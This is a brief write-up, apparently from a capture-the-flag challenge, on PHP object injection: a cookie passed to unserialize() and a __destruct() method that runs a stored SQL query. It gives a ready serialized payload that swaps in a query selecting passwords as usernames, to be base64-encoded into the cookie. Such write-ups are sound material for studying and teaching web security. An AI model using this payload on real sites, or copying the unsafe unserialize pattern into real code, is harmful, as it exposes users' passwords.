### Object injection &&& sqlite injection 


Vulnerablity :

```php

// object injection 

$sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));


//  Magin function !!!!!

 public function __destruct() {
 
 
        if (!isset ($this->conn)) {
            $this->connect ();
        }
        
        $ret = $this->execute ();
        
        ...
        
        echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
            }

```

The actual object is of type array but here we modify it to an sql object with our query like this

O:3:"SQL":2:{s:5:"query";s:37:"SELECT password AS username  FROM users";s:4:"conn";N;}

the tricky part here is use of AS coz only username field is used !!!!!!

and set the base-64 content of serialized object as our cookie and the rest is taken care by __destruct() 

[Redacted]
